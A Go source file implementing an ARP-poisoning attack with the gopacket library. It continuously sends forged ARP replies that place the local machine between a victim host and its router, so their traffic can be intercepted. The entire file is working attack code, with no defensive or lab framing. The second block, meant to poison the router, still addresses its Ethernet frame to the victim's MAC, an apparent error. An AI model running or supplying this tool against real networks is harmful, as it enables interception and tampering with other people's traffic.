package main

import (
	"fmt"
	"net"
	"os"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func arpPoison(device string, routerMac net.HardwareAddr, routerIP net.IP, localMac net.HardwareAddr, localIP net.IP, victimMac net.HardwareAddr, victimIP net.IP) {

	// Open NIC at layer 2
	handle, err := pcap.OpenLive(device, 1024, false, pcap.BlockForever)
	if err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
	defer handle.Close()

	// create an empty ethernet packet
	ethernetPacket := layers.Ethernet{}
	// create an empty ARP packet
	arpPacket := layers.ARP{}
	// pre populate Arp Packet Info
	arpPacket.AddrType = layers.LinkTypeEthernet
	arpPacket.HwAddressSize = 6
	arpPacket.ProtAddressSize = 4
	arpPacket.Operation = 2
	arpPacket.Protocol = 0x0800

	// continiously put arp responses on the wire to ensure a good posion.
	for {
		/******** posion arp from victim to local ********/

		//set the ethernet packets' source mac address
		ethernetPacket.SrcMAC = localMac

		//set the ethernet packets' destination mac address
		ethernetPacket.DstMAC = victimMac

		//set the ethernet packets' type as ARP
		ethernetPacket.EthernetType = layers.EthernetTypeARP

		// create a buffer
		buf := gopacket.NewSerializeBuffer()
		opts := gopacket.SerializeOptions{}

		// customize ARP Packet info

		arpPacket.SourceHwAddress = localMac
		arpPacket.SourceProtAddress = routerIP
		arpPacket.DstHwAddress = victimMac
		arpPacket.DstProtAddress = victimIP

		// set options for serializing (this probably isn't needed for an ARP packet)

		// serialize the data (serialize PREPENDS the data)
		err = arpPacket.SerializeTo(buf, opts)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

		err = ethernetPacket.SerializeTo(buf, opts)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

		// turn the packet into a byte array
		packetData := buf.Bytes()

		//remove padding and write to the wire
		handle.WritePacketData(packetData[:42])
		//Sleep so we don't flood with ARPS
		time.Sleep(50 * time.Millisecond)
		/******** end posion arp from victim to local ********/

		/******** posion arp from router to local ********/

		//set the ethernet packets' source mac address
		ethernetPacket.SrcMAC = localMac

		//set the ethernet packets' destination mac address
		ethernetPacket.DstMAC = victimMac

		//set the ethernet packets' type as ARP
		ethernetPacket.EthernetType = layers.EthernetTypeARP

		// customize ARP Packet info

		arpPacket.SourceHwAddress = localMac
		arpPacket.SourceProtAddress = victimIP
		arpPacket.DstHwAddress = routerMac
		arpPacket.DstProtAddress = routerIP

		// set options for serializing (this probably isn't needed for an ARP packet)

		// serialize the data (serialize PREPENDS the data)
		err = arpPacket.SerializeTo(buf, opts)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

		err = ethernetPacket.SerializeTo(buf, opts)
		if err != nil {
			fmt.Println(err)
			os.Exit(1)
		}

		// turn the packet into a byte array
		packetData = buf.Bytes()

		//remove padding and write to the wire
		handle.WritePacketData(packetData[:42])
		/******** end posion arp from router to local ********/

		//Sleep so we don't flood with ARPS
		time.Sleep(5 * time.Second)
	}
}
